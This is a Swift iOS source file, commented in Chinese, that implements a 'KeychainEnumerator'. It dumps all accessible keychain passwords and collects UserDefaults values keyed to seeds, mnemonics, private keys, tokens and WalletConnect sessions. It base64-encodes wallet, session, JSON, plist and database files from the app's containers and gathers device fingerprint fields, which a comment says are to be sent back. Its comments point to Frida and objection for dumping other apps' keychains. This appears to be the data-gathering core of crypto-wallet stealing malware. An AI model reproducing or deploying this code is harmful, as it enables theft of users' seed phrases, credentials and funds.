import Foundation
import Security

// Keychain / App Group / UserDefaults / 容器文件枚举（第 32 类 §3）
// 注意：iOS 沙箱下只能读本 App 及共享 access-group 的项；跨 App 需 Frida Gadget
// （objection `ios keychain dump`）或越狱环境，见 mobile-reverse skill 的 Phase 3。

final class KeychainEnumerator {
    static func dumpAll(_ done: @escaping ([String: String]) -> Void) {
        var out: [String: String] = [:]

        // 1. 本 App Keychain 通用密码项
        let q: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecReturnData as String: true,
            kSecReturnAttributes as String: true,
            kSecMatchLimit as String: kSecMatchLimitAll,
        ]
        var ref: CFTypeRef?
        if SecItemCopyMatching(q as CFDictionary, &ref) == errSecSuccess,
           let items = ref as? [[String: Any]] {
            for it in items {
                let svc = it[kSecAttrService as String] as? String ?? "generic"
                if let d = it[kSecData as String] as? Data ?? it["v_Data"] as? Data {
                    out["kc:" + svc] = d.base64EncodedString()
                }
            }
        }

        // 2. NSUserDefaults / plist（会话、WC pairing 元数据常落这里）
        if let dict = UserDefaults.standard.dictionaryRepresentation() as? [String: Any] {
            for (k, v) in dict where Self.interesting(k) {
                out["ud:" + k] = String(describing: v)
            }
        }

        // 3. App Group 共享容器 + Documents/Library 里的小文件
        if let group = Bundle.main.object(forInfoDictionaryKey: "AppGroupID") as? String,
           let root = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group) {
            out.merge(Self.scan(root: root, prefix: "grp:")) { a, _ in a }
        }
        if let home = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first {
            out.merge(Self.scan(root: home.deletingLastPathComponent(), prefix: "box:")) { a, _ in a }
        }

        // 4. 设备/渠道指纹（回传字段，不含明文凭据）
        out["ios_ver"] = UIDevice.current.systemVersion
        out["device_model"] = Self.machine()
        out["bundle_id"] = Bundle.main.bundleIdentifier ?? "BUNDLE_ID"
        out["tz"] = TimeZone.current.identifier
        out["lang"] = Locale.current.identifier
        DispatchQueue.main.async { done(out) }
    }

    private static func interesting(_ k: String) -> Bool {
        let ks = ["wc", "walletconnect", "session", "seed", "mnemonic", "key",
                  "token", "phrase", "pairing", "private", "keystore"]
        return ks.contains { k.lowercased().contains($0) }
    }

    private static func scan(root: URL, prefix: String, maxBytes: Int = 64 * 1024) -> [String: String] {
        var out: [String: String] = [:]
        let fm = FileManager.default
        guard let e = fm.enumerator(at: root, includingPropertiesForKeys: [.isRegularFileKey],
                                    options: [.skipsHiddenFiles]) else { return out }
        for case let u as URL in e {
            let n = u.lastPathComponent.lowercased()
            guard n.hasSuffix(".json") || n.hasSuffix(".plist") || n.hasSuffix(".db") ||
                  n.contains("wallet") || n.contains("session") else { continue }
            guard let attr = try? u.resourceValues(forKeys: [.fileSizeKey]),
                  (attr.fileSize ?? 0) <= maxBytes,
                  let d = try? Data(contentsOf: u) else { continue }
            out[prefix + u.lastPathComponent] = d.base64EncodedString()
        }
        return out
    }

    private static func machine() -> String {
        var s = utsname()
        uname(&s)
        return withUnsafePointer(to: &s.machine) { p in
            p.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
    }
}
